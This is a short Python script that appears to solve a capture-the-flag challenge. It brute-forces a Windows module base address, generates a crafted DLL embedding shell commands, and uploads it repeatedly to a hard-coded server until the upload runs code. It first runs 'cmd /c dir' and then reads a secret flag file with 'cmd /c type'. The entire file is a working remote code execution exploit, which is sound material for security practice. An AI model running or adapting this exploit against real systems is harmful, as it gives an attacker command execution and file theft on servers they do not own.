#!/usr/bin/python3

from requests import post
from ws2008 import gen_by_addr
from time import sleep

BASE_DLL = 'template.dll'
URL = 'http://159.89.43.21:1337'
DIR_CMD = b'cmd /c dir'
FLAG_CMD = b'cmd /c type secret\\flag.txt'

start_addr = 0x76000000
end_addr   = 0x78000000
step_addr  = 0x00010000
base_addr  = 0
delta      = 0

found_base = False

for base_addr in range(start_addr, end_addr, step_addr):
    for delta in [0x120000, 0x220000]:
        print(f'Trying {hex(base_addr)} and {hex(delta)} ...')
        gen_by_addr(base_addr, BASE_DLL, DIR_CMD, delta)
        response = post(URL, files={'file': open('safe.dll', 'rb')}).text
        # sleep(0.3)
        
        if 'Something went wrong' in response:
            continue
        else:
            found_base = True
            break
    if found_base:
        break

print(f'Found: {hex(base_addr)} and {hex(delta)}')
print(response)

gen_by_addr(base_addr, BASE_DLL, FLAG_CMD, delta)
response = post(URL, files={'file': open('safe.dll', 'rb')}).text
print(response)

